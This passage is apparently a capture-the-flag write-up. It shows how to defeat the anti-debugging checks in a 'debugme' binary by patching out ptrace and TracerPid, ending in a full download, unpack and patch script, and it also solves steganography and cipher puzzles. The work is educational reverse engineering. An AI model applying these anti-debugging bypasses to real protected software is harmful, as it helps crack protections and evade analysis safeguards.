- `0x55c1c0`-`0x55c1e0`: `"/proc/self/status"`
- `0x55c1e0`-`0x55c1f0`: `"TracerPid:"`
- `0x55c210`-`0x55c240`: `"I'm thinking of a number between 1 and 3000000."`
- `0x55c240`-`0x55c270`: `"Guess it and I'll give up my secrets."`
- `0x55c270`-`0x55c2b0`: `"I don't think you understand how numbers work..."`
- `0x55c2b0`-`0x55c300`: `"Are you trying to influence me? Your Jedi mind tricks are no good here."`
- `0x55c320`-`0x55c360`: `"Hmm, that doesn't SEEM like an answer I'd give..."`
- `0x55c370`-`0x55c390`: `"Wow! You must be psychic!"`
- `0x55c390`-`0x55c3e0`: `"Looks like you messed something up, I can't calculate the flag properly!"`
- `0x55c3e0`-`0x55c400`: `"flag{DebuggerXordinaire-%X-%X}"`
- `0x55c400`-`0x55c440`: `"Here you go, but keep in mind that the flag is time-sensitive."`
- `0x55c440`-`0x55c470`: `"Nope! Next time, try concentrating harder."`

In the end we get what looks like the printf format for the flag `"flag{DebuggerXordinaire-%X-%X}"` (submitting this is not accepted), as well as a few other interesting strings. But in particular extra copies of all the string we recognize from our `RE_main` function: there's a second copy somewhere else, what does this mean?

The executable is detecting when we attach a debugger and flipping into a honeypot mode mimicking the original behaviour, but without giving up the flag as a possibility. There are several ways we can discover this:

- If we attach the debugger in the middle of execution, (i.e. after being prompted for input) we'll see it is already being traced.
   1. `./debugme_unpacked`
   2. Wait for the input prompt but leave it.
   3. Switch to another terminal, leaving the first one hanging.
   4. `pgrep debugme | xargs -I {} gdb --pid` Attach the debugger to the running process by using `pgrep` to search for its process id, and then using it attach `gdb`, using `xargs` to pass the argument.
   5. We see an error message of the form `Warning process {x} is already traced by process {y}`
   6. If we search for this process id with `ps -ef` we'll see it is the parent bash process.
- If we run with `strace` we see a call to `openat` with the file path of `"/proc/self/status"`, and then a `read` where we see the expected contents. This is presumably to check for the `"TracerPid"` parameter, which when non-zero implies it is being traced.
   - `strace ./debugme_unpacked` 
   - We can find both `"/proc/self/status"` and `"TracerPid"` amongst our XOR encrypted strings, and they are beside eachother in the .data section.
- If we patch the strings in the binary we can see the different ones used when we attach vs detach the debugger. See below.

Here are a few good resources on anti-debugging techniques, particularly for Linux:

- <https://github.com/yo-yo-yo-jbo/anti_debugging_intro/>
- <https://github.com/yellowbyte/analysis-of-anti-analysis/blob/develop/research/hiding_call_to_ptrace/hiding_call_to_ptrace.md>
- <https://linuxsecurity.com/features/anti-debugging-for-noobs-part-1>
- <https://dev.to/nuculabs_dev/bypassing-ptrace-calls-with-ldpreload-on-linux-12jl>
- <https://seblau.github.io/posts/linux-anti-debugging>
- <https://github.com/BarakAharoni/LADD>
- <https://github.com/hexabeast/Sytrace?tab=readme-ov-file>
- <https://7rocky.github.io/en/ctf/htb-challenges/reversing/anti-flag/>
- <https://lifeinhex.com/solving-0x777hs-crackme/>
- <https://www.youtube.com/watch?v=eyHFuTi59k4>
- <https://anti-debug.checkpoint.com/techniques/assembly.html>
- <https://www.deepinstinct.com/blog/common-anti-debugging-techniques-in-the-malware-landscape>
- <https://www.youtube.com/watch?v=RCgEIBfnTEI>
- <https://mrt4ntr4.github.io/JustCTF-debugme/>
- <https://www.youtube.com/watch?v=CgGha_zLqlo>

Now, to tell if the debugger has been detected we can patch the binary: we can update the strings so they are marked differently depending on which state the program is in. We can do this in Python like so:

```Python
with open('debugme_unpacked', 'rb') as f:
   data = bytearray(f.read())

xorkey_0 = 23 # The first byte of the XOR key
offset = 0x400000
addrs = [
   (0x0055c008, 0x55c210), # "I'm thinking..."
   (0x0055c038, 0x55c240), # "Guess..."
   (0x0055c060, 0x55c270), # "I don't..."
   (0x0055c0f8, 0x55c440), # "Nope..."
]

for debug,xorvl in addrs:
   data[debug-offset] = ord('0')
   data[xorvl-offset] = ord('1') ^ xorkey_0

with open('debugme_marked', 'wb') as f:
   f.write(data)

```

And indeed running `./debugme_marked` vs `gdb ./debugme_marked` we see the `'1'` vs `'0'` markers at the start of each string. So what should we do from here? Well we're set up nicely to try to disable the ant-debugging measures and check that we are successful.

From our previous analysis with `strace` and trying to attach `gdb` midway through execution we can tell that the logic is first it checks `"/proc/self/status"` for `"TracerPid"` to see if it is already being traced, if so flips to honeypot, if not attempts to call `ptrace` on itself and if that fails also flip to the honeypot. So let's start by seeing if patching the binary again to this time try to disrupt the use of `"TracerId"`.

```Python
with open('debugme_marked', 'rb') as f:
   data = bytearray(f.read())

xorkey_0 = 23 # The first byte of the XOR key
offset = 0x400000

data[0x55c1e0-offset] = ord('_') ^ xorkey_0

with open('debugme_notracerid', 'wb') as f:
   f.write(data)
```

Now when we run `strace ./debugme_notracerid` we see there is a syscall to `ptrace`, in fact it is `ptrace(PTRACE_PTRACEME)` meaning it is asking its parent process to trace it, and we can't attach the debugger midway through still. So we disabled the first check for `"TracerPid"` successfully, but we still need to disable the syscall to `ptrace`. How can we do this? We should start by finding the syscall to `ptrace`. I haven't been able to tell if an obfuscated `<sys/ptrace.h>` is present in the code, however all we need is the syscall itself. Ghidra has a great script, `ResolveX86orX64LinuxSyscallsScript.java` which does exactly what the name implies: it resolves all the instances of `syscall()` in the decompilation and adds comments in the `SYSCALL` listing to the Linux syscall used. Now when we search for `ptrace` in the Functions in Ghidra we see it is present and there is 1 reference: `FUN_0051b6d0:0051b72c`. Again I am not sure what this `FUN_0051b6d0` is, but we can see the results of the `ptrace` function are being checked. So we should read the documention on `ptrace` to understand its expected return value, [here](https://man7.org/linux/man-pages/man2/ptrace.2.html). We see with the argument of enum `PTRACE_TRACEME` the rest of the arguments are ignored, so that's good. For the return value, we see it is `-1` on error (e.g. already being traced), but doesn't specify any other values for `PTRACE_TRACEME`. So what if we patch the binary to replace the syscall to simply write a non-negative value to the function output since that's the only thing expected.

The output of a function call or syscall in x86 assembly is placed in the `rax` register. So we'll want to set its value. There are many ways to do this, but here is a flexible one:

```Assembler
mov %rax,0x0
```

But we need the bytes representation to patch the binary. How can we get this? There are several ways, arguably the best using the `gcc` compiler for the x86-64 architecture itself. A popular online resource for this is [godbolt](https://godbolt.org/), as well as [defuse](https://defuse.ca/online-x86-assembler.htm). See the `gcc` documentation [here](https://gcc.gnu.org/onlinedocs/gcc/Overall-Options.html) and the `objdump` documentation [here](https://man7.org/linux/man-pages/man1/objdump.1.html), as well as some guides on x86-64 assembly language [here](https://web.stanford.edu/class/cs107/guide/x86-64.html), [here](https://imada.sdu.dk/u/kslarsen/dm546/Material/IntelnATT.htm) and [here](https://en.wikibooks.org/wiki/X86_Assembly).

```bash
echo 'mov %rax,0' | gcc -c -x assembler -o asm.o - && objdump -dw asm.o
```

This command will take a single line of assembler, `mov %rax,0`, and pipe it to `gcc`, since we're reading from `stdin` via `-` we need to specify language `-x assembler`, and we need to specify we're only compiling `-c`, not linking, and we'll place it in a temporary output `-o asm.o`, before we use `objdump` to dissassemble the temporary obj file to get the byte representation of the main line we passed `-d asm.o`, and its more legible in wide format `-w`.

This gives us `0x48 0x89 0x04 0x25 0x00 0x00 0x00 0x00`. This is 8 bytes and looking at the syscall in Ghidra's listing at `0x0051b72c` we see it is only 2 bytes. The instruction above is `mov %eax,0x65`, which sets the lower 32 bits of `rax`, and takes 5 bits. So we'll need a shorter way. We could try simply patching out the syscall with `nop`s and see if it will be accepted.

```bash
echo 'nop' | gcc -c -x assembler -o asm.o - && objdump -dw asm.o
```

This shows us that the single byte code for `nop`, "no operation", is `0x90`. We could have also just Googled this.

```Python
with open('debugme_notracerid', 'rb') as f:
   data = bytearray(f.read())

addr = 0x0051b72c
offset = 0x400000

data[addr-offset:addr-offset+2] = [0x90,0x90]

with open('debugme_noptrace', 'wb') as f:
   f.write(data)
```

And now when we run `./debugme_noptrace`, `gdb ./debugme_noptrace` and `strace ./debugme_noptrace` we see there is no syscall to `ptrace` anymore, and even better, the program no longer detects the debugger and no longer flips to the honeypot mode. One last note I'd like to add here is that it seems to also check if the environment variable `LD_PRELOAD` is set and will flip to honeypot mode if it is. This is because `LD_PRELOAD` is used to preload libraries and can be used to override `ptrace`, though it doesn't seem to work on the statically linked and syscalled `ptrace` of `debugme`. We can patch the binary to prevent it from detecting the `LD_PRELOAD` environment variable, but we don't need to. More information on this approach can be found [here](https://dev.to/nuculabs_dev/bypassing-ptrace-calls-with-ldpreload-on-linux-12jl), [here](https://seblau.github.io/posts/linux-anti-debugging), and in the links above on anti-debugging in Linux.

So now we are able to attach the debugger without being detected, what's next? Well we have the references to where the hidden strings, including the template for the flag, were used before. Let's investigate. Interestingly, all the hidden strings start addresses are each referenced once, in the function `FUN_00404280`. We can get this more clearly with Ghidra scripting:

```Python
xorkey = [23, 69, 15, 28, 184, 234, 14, 82, 120, 130, 5, 31, 5, 151, 27, 164, 49, 23, 94, 205, 226, 199, 138, 75, 226, 75, 115, 52, 199, 9, 19, 252, 171, 163, 17, 231, 28, 26, 231, 19, 140, 116, 129, 23, 25, 87, 219, 173, 165, 150, 215, 104, 166, 236, 132, 58, 246, 156, 145, 4, 187, 191, 133, 122, 127, 154, 120, 231, 32, 117, 184, 14, 0, 193, 124, 17, 237, 174, 105, 236]
xor_string_addrs = ['0x55c1c0', '0x55c1e0', '0x55c210', '0x55c240', '0x55c270', '0x55c2b0', '0x55c320', '0x55c370', '0x55c390', '0x55c3e0', '0x55c400', '0x55c440']
xor_string_refs = []

for addr in xor_string_addrs:
   addr = toAddr(int(addr,16))
   xref = getReferencesTo(addr)[0].getFromAddress()
   plaintext = ''.join(chr(getByte(addr.add(i)) & 0xFF ^ c) for i,c in enumerate(xorkey)).split(chr(0))[0]
   xor_string_refs.append((xref, addr, plaintext))
   print('- {}:{} -> {} "{}"'.format(getFunctionContaining(xref), xref, addr, plaintext))
```

Note we need to copy over the XOR key and string addresses from the analysis we did the in the Jupyter Notebook. The result gives us:

- `FUN_00404280`:`0x004042cd` -> `0x0055c1c0` `"/proc/self/status"`
- `FUN_00404280`:`0x004044ef` -> `0x0055c1e0` `"TracerPid:"`
- `FUN_00404280`:`0x00404858` -> `0x0055c210` `"I'm thinking of a number between 1 and 3000000."`
- `FUN_00404280`:`0x00404946` -> `0x0055c240` `"Guess it and I'll give up my secrets."`
- `FUN_00404280`:`0x00404e88` -> `0x0055c270` `"I don't think you understand how numbers work..."`
- `FUN_00404280`:`0x00405047` -> `0x0055c2b0` `"Are you trying to influence me? Your Jedi mind tricks are no good here."`
- `FUN_00404280`:`0x004052fe` -> `0x0055c320` `"Hmm, that doesn't SEEM like an answer I'd give..."`
- `FUN_00404280`:`0x004054bb` -> `0x0055c370` `"Wow! You must be psychic!"`
- `FUN_00404280`:`0x00405752` -> `0x0055c390` `"Looks like you messed something up, I can't calculate the flag properly!"`
- `FUN_00404280`:`0x00405837` -> `0x0055c3e0` `"flag{DebuggerXordinaire-%X-%X}"`
- `FUN_00404280`:`0x00405933` -> `0x0055c400` `"Here you go, but keep in mind that the flag is time-sensitive."`
- `FUN_00404280`:`0x00404bce` -> `0x0055c440` `"Nope! Next time, try concentrating harder."`

So `FUN_00404280` is probably our true `main` function, so we can rename it `RE_true_main`. Looking at its decompile in Ghidra, it looks very convoluted and obfuscated still, with lots of blocks of `CONCAT44`, `^`, addressing and indexing, so I won't post the raw decompile code here, but I'll talk about what patterns there are and how we can make sense of it.

We do see several of the `RE_puts` we identified in from the honeypot section, and even a section by `0x00404a85` which contains `RE_puts`, then `RE_fgets`, then `RE_strtoul`, and even `if (2999999 < uVar11 - 1)`, just like in the honeypot! Furthermore we notice similar patterns of data moving (addressing, indexing, `CONCAT44`) and XORing `^` before each `RE_puts`, so presumably these much be the decrypting blocks. One thing we can do is use Ghidra Python scripting to get the order of these known function call, then use `gdb` to set breakpoints on each call and check the inputs, so we can label them apropriately.

```Python
RE_true_main = getFunctionAt(toAddr(0x00404280))
called_functions = list(getFunctionAt(toAddr(0x00404280)).getCalledFunctions(ghidra.util.task.TaskMonitor.DUMMY))
print(called_functions)
known_called_functions = [f for f in called_functions if f.getName().startswith('RE')]
print(known_called_functions)
RE_true_main_known_calls = sorted([(xref.getFromAddress(), f) for f in known_called_functions for xref in getReferencesTo(f.getEntryPoint()) if getFunctionContaining(xref.getFromAddress()) == RE_true_main])
print(RE_true_main_known_calls)

RE_true_main_order = sorted(xor_string_refs + RE_true_main_known_calls)
for event in RE_true_main_order:
   if isinstance(event[-1],str):
      print('- {}: load {}:"{}"'.format(*event))
   else:
      print('- {}: call {}'.format(*event))

# We can create a gdb command file for the breakpoints
with open('breakpoint_RE_true_main_known_calls.gdb', 'w') as f:
   for event in RE_true_main_known_calls:
      f.write('b *0x{}'.format(event[0]))
```

Which shows us:

- `004042cd`: load `0055c1c0`:`"/proc/self/status"`
- `004044ef`: load `0055c1e0`:`"TracerPid:"`
- `00404858`: load `0055c210`:`"I'm thinking of a number between 1 and 3000000."`
- `00404941`: call `RE_puts`
- `00404946`: load `0055c240`:`"Guess it and I'll give up my secrets."`
- `00404a85`: call `RE_puts`
- `00404aa6`: call `RE_fgets`
- `00404ac0`: call `RE_strtoul`
- `00404bce`: load `0055c440`:`"Nope! Next time, try concentrating harder."`
- `00404cdb`: call `RE_puts`
- `00404d0c`: call `RE_strtoul`
- `00404e88`: load `0055c270`:`"I don't think you understand how numbers work..."`
- `00404fd6`: call `RE_puts`
- `00405047`: load `0055c2b0`:`"Are you trying to influence me? Your Jedi mind tricks are no good here."`
- `00405204`: call `RE_puts`
- `004052fe`: load `0055c320`:`"Hmm, that doesn't SEEM like an answer I'd give..."`
- `0040544a`: call `RE_puts`
- `004054bb`: load `0055c370`:`"Wow! You must be psychic!"`
- `0040559f`: call `RE_puts`
- `00405752`: load `0055c390`:`"Looks like you messed something up, I can't calculate the flag properly!"`
- `004057d2`: call `RE_puts`
- `00405837`: load `0055c3e0`:`"flag{DebuggerXordinaire-%X-%X}"`
- `00405933`: load `0055c400`:`"Here you go, but keep in mind that the flag is time-sensitive."`
- `00405ae5`: call `RE_puts`
- `00405aed`: call `RE_puts`

We can be pretty certain of which `RE_puts` calls correspond to which strings, but we can double check with `gdb`:

1. `gdb ./debugme_noptrace`
2. `(gdb) source breakpoint_RE_true_main_known_calls.gdb`
3. `(gdb) r`
4. Breakpoint hit `0x00404941`
5. `(gdb) printf "%s", $rdi` Sure enough shows `"I'm thinking of a number between 1 and 3000000."`
6. `(gdb) cont`
7. Breakpoint hit `0x00404a85`
8. `(gdb) printf "%s", $rdi` Sure enough shows `"Guess it and I'll give up my secrets."`
9. `(gdb) cont`
10. Breakpoint hit `0x00404aa6`
11. `(gdb) cont`
12. Give any input. Here I'll assume valid input, but you can check the other path as well.
13. Breakpoint hit `0x00404ac0`
14. `(gdb) printf "%s", $rdi` Sure enough shows the input you gave.
15. `(gdb) nexti` Continue over the call to get the result.
16. `(gdb) p $rax` We can see the result of the function call indeed turned out input string into an `unsigned long` value.
17. `(gdb) cont`
18. Breakpoint hit `0x0055c440`
19. `(gdb) printf "%s", $rdi` Sure enough shows `"Nope! Next time, try concentrating harder."`

Given our confirmations we can comment each of these `RE_puts` calls in Ghidra with their known strings. We can even do this programmatically with Ghidra Python scripting:

```Python
PRE_COMMENT = ghidra.program.model.listing.CodeUnit.PRE_COMMENT
string_stack = []
for event in RE_true_main_order:
   if isinstance(event[-1],str):
      string_stack.append(event)
   elif event[-1].getName() == 'RE_puts':
      currentProgram.getListing().getCodeUnitAt(event[0]).setComment(PRE_COMMENT, 'print "{}"'.format(string_stack.pop()[-1]))

```

Now reading through the strings and looking at the logic we can fill in a few more pieces. In particular some guesses for some functions. Here is a cleaned up and stripped down version of the decompile of the main logic of the program:

- `FUN_004c5320` -> `RE_exit`: Because after its call the program exits, and the exit code of `0` is a commonly seen call in C programs. (documentation [here](https://man7.org/linux/man-pages/man3/exit.3.html))
   - We can verify with `gdb`
   1. `gdb ./debugme_noptrace`
   2. `(gdb) b *0x00404fdd`
   3. `(gdb) r`
   4. Give a non-numerical answer.
   5. Breakpoint hit.
   6. `(gdb) nexti` to run the function call without entering it.
   7. You will see the program exits. It does not return after the call.
- `FUN_004c54b0` -> `RE_getrandom`: Because if we look carefully it's used before random values are needed, and the syscall for `getrandom` is used inside. (documentation [here](https://man7.org/linux/man-pages/man2/getrandom.2.html))

```C
    do {
      num_bytes_filled = RE_getrandom(dest_buffer,8,0);
      target_number = random_value;
    } while (num_bytes_filled != 8);
    counter = 10;
    input_value = 0;
    do {
      do {
        num_bytes_filled = RE_getrandom(dest_buffer,8,0);
      } while (num_bytes_filled != 8);
      if (target_number == random_value) goto LAB_00404e25;
      input_value = input_value + random_value;
      counter = counter + -1;
    } while (counter != 0);
    if (input_value < 10000) {
LAB_00404e25:
      target_number = 3000001;
    }
    else {
      do {
        num_bytes_filled = RE_getrandom(dest_buffer,8,0);
        target_number = random_value;
      } while (num_bytes_filled != 8);
      do {
        num_bytes_filled = RE_getrandom(dest_buffer,8,0);
      } while (num_bytes_filled != 8);
      target_number = (long)(random_value * target_number) % 3000000 + 1;
      DAT_005bd320 = DAT_005bd320 ^ target_number;
      target_number = target_number ^ _DAT_005bd368;
    }
                    /* print "I'm thinking of a number between 1 and 3000000." */
    RE_puts(&print_buffer);
                    /* print "Guess it and I'll give up my secrets." */
    RE_puts(&print_buffer);
    input_ptr = RE_fgets(input_str,32,(FILE *)PTR_DAT_005bbc18);
    if (input_ptr != (char *)0x0) {
      input_value = RE_strtoul(input_str,(char **)0x0,10);
      if (2999999 < input_value - 1) {
                    /* print "I don't think you understand how numbers work..." */
        RE_puts(&print_buffer);
        RE_exit(0);
      }
      if (target_number == 3000001) {
                    /* print "Are you trying to influence me? Your Jedi mind tricks are no good
                       here." */
        RE_puts(&print_buffer);
        RE_exit(0);
      }
      else {
        input_value_copy = input_value;
        if (input_value != (target_number ^ _DAT_005bd368)) {
                    /* print "Nope! Next time, try concentrating harder." */
          RE_puts(&print_buffer);
          goto LAB_00404ce0;
        }
      }
      if (input_value_copy != (DAT_005bd320 ^ DAT_005bd370)) {
                    /* print "Hmm, that doesn't SEEM like an answer I'd give..." */
        RE_puts(&print_buffer);
        RE_exit(0);
      }
                    /* print "Wow! You must be psychic!" */
      RE_puts(&print_buffer);
      if (DAT_005bd328 != 32) {
                    /* print "Looks like you messed something up, I can't calculate the flag
                       properly!" */
        RE_puts(&print_buffer);
        RE_exit(0);
      }
                    /* print "Here you go, but keep in mind that the flag is time-sensitive." */
      RE_puts(&print_buffer);
                    /* print "flag{DebuggerXordinaire-%X-%X}" */
      RE_puts(input_str);
    }
LAB_00404ce0:
    RE_exit(0);
```

So the logic is essentially:

1. Generate random numbers repeatedly, ensure we don't have repeats so there isn't tampering with the random number generator.
2. Get the target number in range using the random values `target_number = (long)(random_value * target_number) % 3000000 + 1;`
3. Store one XOR encrypted copy in `DAT_005bd320`, and XOR encrypt the target number with `_DAT_005bd368`.
4. Get the input and verify it is a number in range.
5. Check the tampering. Report and exit if it was.
6. Verify the input against the temporarily decrypted value. Report and exit if we guessed wrong.
7. Verify the input again against the previous copy to see if we changed it. Report and exit if it was.
8. A final check to calculate the flag, I don't understand.
9. Compute the flag.
10. Report the flag.

If we read the decompile, assembler in the listing, or use the debugger, we will find there is a bug: the target value computed in is using signed division (`IDIV`) on randomely generated bytes which should have been treated as an `unsigned long` to get the remainder mod 3000000. We see this with a typecast in the decompile, `target_number = (long)(random_value * target_number) % 3000000 + 1;`. This means we have about a 50% chance of the target number being negative, and therefore ofside of the range are allowed to guess. I suspect this bug is on purpose for the challenge called "debugme".

1. `gdb ./debugme_noptrace`
2. `(gdb) b *0x004047cc`
3. `(gdb) r`
4. Breakpoint hit.
5. `(gdb) p $r13` We can see sometimes has a negative value. Just run through and try again if it doesn't.

Note we can also use the above debug process to win by knowing the number in case we get a proper target number. However we know the flag is time sensitive. Now whether that is using time differences to compute the valid flag, or we have to submit the flag quickly, I'm not sure. Regardless, we should try to patch the binary to ensure a quick win when running it:

We'll want to take the XOR encrypted value, stored in `%r13`, then decode it the value in `_DAT_005bd368`, which we need to access by relative indexing from the instruction pointer. We'll need to overwrite the input read as well as the attempt to convert the input from `char*` to `unsigned long`, i.e. `0x00404aa6` to `0x00404ad8`. The `mov` and `xor` operations will take a 3 and 7 bytes respectively for a total of 10 bytes, making our offset: `hex(0x005bd368-(0x00404aa6+10))` = `0x1b88b8`.

```Assembler
mov %r13, %rcx
xor 0x1b88b8(%rip),%rcx
```

```Bash
echo 'mov %r13, %rcx;' > patch.asm
echo 'xor 0x1b88b8(%rip),%rcx;' >> patch.asm
gcc -c -o asm.o patch.asm
objdump -dw asm.o | tail -n 2 | grep -o '\b[a-z0-9][a-z0-9]\b' | sed 's/^/0x/' | paste -s -d,
# as a one-liner
echo 'mov %r13,%rcx; xor 0x1b88b8(%rip),%rcx' | gcc -c -x assembler -o asm.o - && objdump -dw asm.o | tail -n 2 | grep -o '\b[a-z0-9][a-z0-9]\b' | sed 's/^/0x/' | paste -s -d,
```

```Python
with open('debugme_noptrace', 'rb') as f:
   data = bytearray(f.read())

start_addr = 0x00404aa6
end_addr = 0x00404ad8
offset = 0x400000

new_instr = [
   0x4c, 0x89, 0xe9,
   0x48, 0x33, 0x0d, 0xb8, 0x88, 0x1b, 0x00
]

l = end_addr-start_addr
data[start_addr-offset:start_addr-offset+l] = new_instr + [0x90]*(l - len(new_instr))

with open('debugme_solution', 'wb') as f:
   f.write(data)
```

Now when we run `./debugme_solution` we immediately get the solution without having to give any input. Submitting the result solve the problem.

I think places for improvement are a better way to automatically resolve the libc functions, a more thorough analysis on the encryption code and how it could be cleaned up in Ghidra, and better insight into how the debugger detection code actually works, as well as the function of the other code blocks left unanalyzed in the main functions.

As a finale, here is a shortest complete script for solving this challenge:

```Bash
wget https://hack.ainfosec.com/static/hackerchallenge/bin/debugme/debugme

git clone https://github.com/NozomiNetworks/upx-recovery-tool.git
cd upx-recovery-tool
sudo apt-get install libmagic1
python3 -m pip install -r requirements.txt
python3 upxrecovertool.py -i ../debugme -o ../debugme
cd ..

wget https://github.com/upx/upx/releases/download/v3.96/upx-3.96-amd64_linux.tar.xz
tar -xf upx-3.96-amd64_linux.tar.xz
mv upx-3.96-amd64_linux/upx .
./upx -d debugme

printf '\x4c\x89\xe9\x48\x33\x0d\xb8\x88\x1b\x00' | dd of=debugme bs=1 seek=$((0x404aa6-0x400000)) count=10 conv=notrunc
printf '\x90%.0s' $(seq $((0x404ad8-0x404aa6-10))) | dd of=debugme bs=1 seek=$((0x404aa6-0x400000+10)) count=$((0x404ad8-0x404aa6-10)) conv=notrunc

chmod u+x debugme
./debugme
```


### Steganography
#### Frequency Analysis (25 points)
We are given a file `flagged-waveform` with no file extension, but looking at the file's binary in a hexdump, we quickly see it's starts with the file signature `RIFF` and `WAVEfmt`, indicating it's a `.wav` file, and indeed we can open it with music player apps.
You can find a good list of file signature [here](https://en.wikipedia.org/wiki/List_of_file_signatures).

```Bash
xxd flagged-waveform | head
```

Listening to it, it sounds like a sequence of sine waves of different frequencies. And indeed if we open it with a waveform viewing tool like Audacity, we see exactly that, along with the length of each frequency section being exactly 1s.
We can extract the sequence of frequency values using a Fourier transform tool, in particular we want some kind of spectrograph. A convenient way to to this is with Python's `scipy` library, so we can control exactly for the spectrogram is created and then we can work with the data extracted. In particular, simple converting it to ASCII gives us the flag.
We can use the code below:

```Python
import scipy.io.wavfile
import scipy.signal
rate, data = scipy.io.wavfile.read('flagged-waveform')
f, t, Sxx = scipy.signal.spectrogram(data, fs=rate, nperseg=rate, noverlap=0)
freqs = Sxx.argmax(axis=0)
message = ''.join(map(chr,freqs))
print(message)
```

Or use the FrequencyAnalysisSolver.ipynb Jupyter Notebook to accomplish the same thing, with a Matplotlib visualization of the spectrogram as well.


#### Hidden Pictures (75 points)
We are given a file `FlagTime.bmp` which contains a simple black and white image. If we Google steganography for images, we'll quickly come across the concept of LSB (Least Significant Bit) steganography, in which the least significant bit on each color channel for each pixel is used to contain hidden information: the least significant bit will not alter the pixels significantly, hence why it's used. There are a variefy of ways we can check LSB of our image, but regardless of how we do it, we indeed it doesn't look how we would expect it compared to the other bits in each pixel and color channel, and so indeed there is some hidden information there.

Now how can extract and decode it? There are a variety of ways we could order the bits and reconstitute them into bytes with big or little endianness, and then check for either text or files within the reconstituted data. We could implement this in Python with Pillow, Numpy, itertools and python-magic (the filetype identification library), however we can also use the popular tool which has implemented all of this and more or us, zsteg, which runs on ruby.

```Bash
sudo apt install ruby
sudo apt install zsteg
```

We can see a list of hits for zsteg with:

```Bash
zsteg FlagTime.bmp
```

Which gives us mostly garbage strings and unlikely file types, but the top hit is another bitmap image of size `40 * 36 * 24`: the likelihood to have a properly constructed header for this kind of file is low, so this is almost certainly a correct hit. It also reports the encoding `b1,lsb,bY` meaning 1 bit of each byte used `b1`, pack to bytes with little endianness `lsb`, and read the bytes in with the Y coordinates flipped `bY`. This especially makes sense since .bmp files actually start from the lower left corner and go left-right, "bottom-up", unlike most pixel indexing schemes. See more information on .bmp files [here](https://en.wikipedia.org/wiki/BMP_file_format). Given all this, we can extrace the hidden picture like so:

```Bash
zsteg -E b1,lsb,bY FlagTime.bmp > hidden.bmp
```

The image we get looks like noise, with with some interesting characteristics, like a distinct top border. Clearly there is more hidden in this image. If we look at the bytes in a hexdump we'll see the following that the reserved bits of the header contain the word "FAKE", but also afterwards we see "BMP" and later "FLAG". Looks like another hidden picture is directly inside the pixels. We can again use zsteg, which will remport another bitmap in the `imagedata`.

```Bash
xxd hidden.bmp | head
zsteg hidden.bmp
zsteg -E imagedata hidden.bmp > flag.bmp
```

In my flag.bmp I now see the final flag text written out in different colors, and is a reference to the pictures within pictures being a "matryoshka". Submitting it solves the challenge.


### Crypto
#### Skip Cipher (25 points)
From the looks of the text and the title, we can conclude that to decrypt the text we need to start with the first letter (which is the only one capitalized after all), then step some number of letters before taking the next letter and repeat until we cover the entire string, wrapping as needed.
The skip stride length should be coprime to the encrypted text so as to hit each letter once, but we can also check each possible stride.
We can get a wordlist of common English words and check which candidate solution contains the most English words, because that's very likely our solution.

Here's the Python code to solve the problem. We can also use the attached SkipCipherSolver.ipynb Jupyter Notebook as well.

```Python
cipher_text = "Irntfsnie  dp aav sgr  en toeedyleh.easosdkhndnesw a"
n = len(cipher_text)

import requests
r = requests.get("https://www.mit.edu/~ecprice/wordlist.10000")
#r = requests.get('https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt')
wordlist = set(r.text.splitlines())

plain_text = ''
wordcount = 0
solution_stride = 0
for stride in range(n):
    decoded = ''.join(cipher_text[(stride*i)%n] for i in range(n))
    decoded_wordcount = sum(w in wordlist for w in decoded.split(' '))
    if decoded_wordcount > wordcount:
        wordcount = decoded_wordcount
        solution_stride = stride
        plain_text = decoded
print('stride:', solution_stride)
print(plain_text)
```


#### Encoded (75 points)
As the hint says, the data isn't encrypted, but is encoded, several times. We need to recognize the forms of encoding in order to decode the flag.

1. The given string contains only digits and letters a-f, which implies it's byte data encoded in hexadecimal. We can use Python's `bytearray.fromhex` to decode to bytes.
2. The bytes starts with the bytes for PK, the file signature for zip files. We can use Python's `zipfile` library, which indeed shows we have a zip archive containing a file `flag.txt`, which contains our next encoded string.
3. The string contains digits, uppercase and lowercase letters, as well as the `+` and `/` characters, which is the set of characters for base64 encoding. We can use Python's `base64` library to decode to bytes.
4. The bytes starts with the bytes for BZhm the file signature for bzip2 compressed data. We can use Python's `bz2` library to decompress to bytes.
5. The bytes are an ascii string for groups of space-separated strings of 1s and 0s. Clearly these represent bytes. With Python we can split the string by spaces and for each binary string interpret it as binary to integer using `int(c,2)`.
6. Interpreting the byte string as ascii contains only digits and letters a-f, which implies it's byte data encoded in hexadecimal, same as step 1. Using Python's `bytearray.fromhex` again, gives us the flag.

The EncodedSolver.ipynb Jupyter Notebook will perform all the steps, and show the outputs after each step.


#### XOR (100 points)
Given the key is 6 characters long, that's 56,800,235,584 possibilities to try, so not impossible to bruteforce, but we can do better by going the other way with a wordlist: checking for candidate common words to recover the key from the ciphertext and check our candidate key decrypts the entire ciphertext into plaintext with common words.

```Python
ciphertext = "205c04451a31015642581e701f5a09544d351d47105e1d2949132b454d39001306580b361a50175d1970075c42561f3100434e111a351a540a424d3e1c470a5803375f13035f09701c5107481e70075b07113e35105c0c554d1c1244425e0b70275b0743003f174a0c50003910405911047e161d4e11042453520e460c2900130b5f0e22165211541e7e"
key_len = 6

hex_data = bytearray.fromhex(ciphertext)
n = len(hex_data)
key_reps = n//6

import requests
r = requests.get('https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt')
wordlist = r.text.splitlines()
wordset = set(wordlist)

key = ''
plaintext = ''
matches = 0
used_word = ''
used_freq = 0
for freq,word in enumerate(wordlist):
    if len(word) >= key_len-2: # use only words, whom with their spaces, will cover the key
        #print(word)
        xor = f" {word} "[:key_len].encode() # use only what's needed to cover the key
        for i in range(n-key_len): # check anywhere in the plaintext
            candidate_key = bytes([k^c for k,c in zip(xor, hex_data[i:i+key_len])])
            candidate_key = candidate_key[key_len-i%key_len:] + candidate_key[:key_len-i%key_len]
            
            candidate_plaintext = bytes([k^c for k,c in zip(candidate_key*key_reps, hex_data)]).decode()
            candidate_matches = len(set(candidate_plaintext.lower().split(' ')) & wordset)
            
            if candidate_matches > matches:
                matches = candidate_matches
                used_word = word
                used_freq = freq
                plaintext = candidate_plaintext
                key = candidate_key

print(f"used word: {used_word}, freq position: {used_freq}/{len(wordlist)}, word matches: {matches}")
print("plaintext:", plaintext)
print("key:", key)
```

The code to do so is in the XORSolver.ipynb Juputer Notebook.


#### ENIGMA (150 points)
To solve this problem I implemeted a very stripped down Enigma I machine simulator. 
Here are the main resources I used to do so:

- https://www.101computing.net/enigma-encoder/
- https://cryptii.com/pipes/enigma-machine
